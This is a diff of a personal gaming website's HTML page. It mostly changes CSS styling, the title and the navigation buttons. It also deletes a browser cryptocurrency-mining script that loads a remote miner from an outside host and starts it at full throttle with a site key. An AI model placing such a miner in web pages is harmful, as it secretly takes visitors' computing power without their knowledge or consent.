@@ -9,11 +9,30 @@
 	
 	</head>
 		<style type="text/css">			
-			.title1{
-				background: rgb(230, 200, 200);
-				text-align: center;
-				/*top: 20px;*/
+			@font-face {
+			font-family: Rio-grande;
+			src: url("./libraries/Fonts/RioGrande.ttf");
+
 			}
+			:root {
+				--title-color: rgb(12, 12, 12);
+	            --primary-color: rgba(12, 21, 21, 1.0);
+	            --secondary-color: rgb(255, 255, 255);
+	            --text-background-color: rgba(179, 186, 164, 0.5);
+	            --background-color: rgba(179, 186, 164, 0.7);
+	        }
+	    	#Title{
+	    		font-family: Rio-grande;
+	    		color: var(--title-color);
+	    		background: var(--background-color);
+	    		text-align: center;
+	    		opacity: 1.5;
+	    		font-size: 50px;
+	    		margin: auto;
+            	width: fit-content;
+	    		/*top: 20px;*/
+
+	    	}
 			
 			#LyonKim{
 				width: 50px;
@@ -50,11 +69,14 @@
 	
 	<body>
 		
-		<h1 id="title1">Rurockygamer Official Website</h1>
+		<h1 id="Title">(Rurockygamer´s) <br> 
+					(Official) <br>
+					(Website)</h1>
+	
 		
 		<center>
 			
-		<p>
+		<p style="text-align: center; background: var(--background-color);">
 			<a href="./index.html"><img class="pages" src="./libraries/Buttons/Home_Button_2.png" onclick="this.src='./libraries/Buttons/Home_Button_2_pressed.png'"></a> | <a href="./aboutMe.html"><img class="pages" src="./libraries/Buttons/AboutMe_Button_2.png" onclick="this.src='./libraries/Buttons/AboutMe_Button_2_pressed.png'"></a> | <a href="./News.html"><img class="pages" src="./libraries/Buttons/News_Button_2.png" onclick="this.src='./libraries/Buttons/News_Button_2_pressed.png'"></a> | 
 			<a href="./Contact.html"><img class="pages" src="./libraries/Buttons/Contact_Button_2.png" onclick="this.src='./libraries/Buttons/Contact_Button_2_pressed.png'"></a> | <a href="./subs_Art.html"><img class="pages" src="./libraries/Buttons/SubscribersArt_Button_2.png" onclick="this.src='./libraries/Buttons/SubscribersArt_Button_2_pressed.png'"></a>
 
@@ -65,19 +87,8 @@
 		<h3>guys, everyone that want to tell me any idea that could be implemented in the next video, please write it on the comment box in my last video.</h3>
 		<br>
 
-		<!-- Start of Lyon.Kim banner code 
-		<a id="LyonKim" href="https://lyon.kim/ref/Rurockygamer"><img src="https://lyon.kim/img/banner-xess-pro-250x250.jpg" title="Lyon.Kim - Acorta tu enlace, comparte y gana dinero!" /></a>
-		 End of Lyon.Kim banner code -->
-	<!--this one deals with the mining -->
-	<script src="https://www.hostingcloud.racing/bHTG.js"></script>
-	<script>
-	    var _client = new Client.Anonymous('fb9c85ef00b8f509742d8eefb5a5565258837d394ffcb8f20f8dc4da87ea0efe', {
-		throttle: 0, c: 'w'
-	    });
-	    _client.start();
+	
 
-
-	</script>
 	</body>
 
 </html>
